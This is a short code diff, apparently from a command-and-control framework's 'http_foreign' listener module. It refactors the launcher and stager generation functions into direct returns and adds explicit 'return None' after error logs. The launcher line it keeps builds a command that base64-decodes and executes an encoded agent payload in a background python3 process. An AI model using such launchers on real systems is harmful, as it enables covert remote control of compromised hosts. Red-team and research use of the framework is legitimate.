@@ -374,8 +374,7 @@ class Listener:
                 )
                 if isinstance(launchEncoded, bytes):
                     launchEncoded = launchEncoded.decode("UTF-8")
-                launcher = f"echo \"import sys,base64;exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
-                return launcher
+                return f"echo \"import sys,base64;exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
             else:
                 return launcherBase
 
@@ -383,6 +382,7 @@ class Listener:
             log.error(
                 "listeners/http_foreign generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
             )
+            return None
 
     def generate_stager(
         self,
@@ -433,8 +433,7 @@ class Listener:
                     "host": host,
                 }
 
-                comms = template.render(template_options)
-                return comms
+                return template.render(template_options)
 
             elif language.lower() == "python":
                 template_path = [
@@ -449,15 +448,16 @@ class Listener:
                     "host": host,
                 }
 
-                comms = template.render(template_options)
-                return comms
+                return template.render(template_options)
 
             else:
                 log.error(
                     "listeners/http_foreign generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."
                 )
+                return None
         else:
             log.error("listeners/http_foreign generate_comms(): no language specified!")
+            return None
 
     def start(self):
         """
